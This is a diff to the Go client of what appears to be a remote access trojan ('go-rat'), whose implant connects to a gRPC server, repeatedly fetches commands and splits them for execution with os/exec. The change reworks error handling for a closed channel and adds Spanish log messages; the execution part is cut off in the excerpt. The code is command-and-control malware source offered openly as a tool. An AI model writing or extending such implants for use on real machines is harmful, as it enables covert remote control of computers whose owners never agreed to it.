@@ -2,12 +2,10 @@ package main
 
 import (
 	"context"
-	"errors"
 	"fmt"
 	"os"
 	"os/exec"
 	"strings"
-	"time"
 
 	"github.com/charmbracelet/log"
 	"github.com/iortego42/go-rat/grpcapi"
@@ -20,6 +18,7 @@ func main() {
 	var (
 		opts   []grpc.DialOption
 		conn   *grpc.ClientConn
+		cmd    *grpcapi.Command = nil
 		err    error
 		client grpcapi.ImplantClient
 	)
@@ -45,29 +44,20 @@ func main() {
 		return
 	}
 	for {
-		cmd, err := client.FetchCommand(ctx, identity)
-		// log a eliminar
-
-		a, ok := status.FromError(errors.New("channel closed"))
-		if ok {
-			log.Info(a)
-			return
-		}
-		if err != nil && err.Error() == a.Err().Error() {
-			log.Debug("hey")
-			return
-		}
-		// TODO: Comparar el tipo de error, si al recibir
+		cmd = nil
+		cmd, err = client.FetchCommand(ctx, identity)
 		if err != nil {
-			fmt.Println(err)
-			fmt.Println(err.Error())
-			log.Fatal("[!] Error al obtener un commando.", "ERROR", err)
-		}
-		if cmd.In == "" {
-			time.Sleep(1000)
-			continue
-		} else {
-			log.Debug("[+] Comando recibido del servidor.", "CMD", cmd.In)
+			statusErr, ok := status.FromError(err)
+			if !ok {
+				log.Fatal("Error desconocido.")
+			}
+			if statusErr.Message() == "channel closed" {
+				return
+			} else {
+				fmt.Println(err)
+				fmt.Println(err.Error())
+				log.Fatal("[!] Error al obtener un commando.", "ERROR", err)
+			}
 		}
 		tokens := strings.Split(cmd.In, " ")
 		var c *exec.Cmd
